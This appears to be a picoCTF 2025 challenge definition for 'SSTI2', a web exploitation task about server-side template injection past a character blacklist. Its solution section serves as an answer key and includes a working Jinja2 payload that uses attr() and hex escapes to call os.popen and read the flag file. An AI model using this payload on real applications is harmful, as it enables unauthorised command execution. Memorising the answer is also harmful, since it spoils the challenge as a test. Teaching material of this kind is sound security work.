# SSTI2

- Namespace: picoctf
- ID: ssti2
- Type: custom
- Category: Web Exploitation
- Points: 200
- Templatable: Yes
- MaxUsers: 1

## Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

## Details

I heard templating is a cool and modular way to build web apps! Check out my website {{link_as('/','here')}}!

## Hints

- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?

## Solution Overview

- Perform a Server Side Template Injection from one of the payloads found in Hacktricks/Payload of All Things
- This relies on using attr() for member access and hex characters to get around the character blacklist filter
- You can run an `ls` command through the payload first to discover the existence of the flag file
- An example payload to get a flag for this would be: `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`
(source: [Payload of All things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass))

## Challenge Options

```yaml
cpus: 0.5
memory: 128m
ulimits:
  - nofile=128:128
diskquota: 64m
```

## Learning Objective

Understanding of Server Side Template Injections

## Tags

- web

## Attributes

- author: Venax
- organization: picoCTF
- event: picoCTF 2025
